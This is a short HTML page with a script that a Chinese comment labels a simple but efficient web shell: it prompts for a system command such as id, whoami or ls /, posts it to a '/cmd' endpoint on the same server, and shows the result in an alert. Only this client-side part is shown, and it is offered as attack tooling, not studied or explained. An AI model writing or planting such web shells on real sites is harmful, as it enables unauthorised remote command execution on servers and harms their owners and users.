<!DOCTYPE html>
<html>
<body>
<script>
  // 简约但高效的 WebShell：通过 fetch 执行命令
  const cmd = prompt("输入要执行的系统命令 (如 id, whoami, ls /)"); 
  if (cmd) {
    fetch('/cmd', { 
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cmd: cmd })
    })
    .then(res => res.text())
    .then(data => alert(data))
    .catch(err => alert('执行失败: ' + err));
  }
</script>
</body>
</html>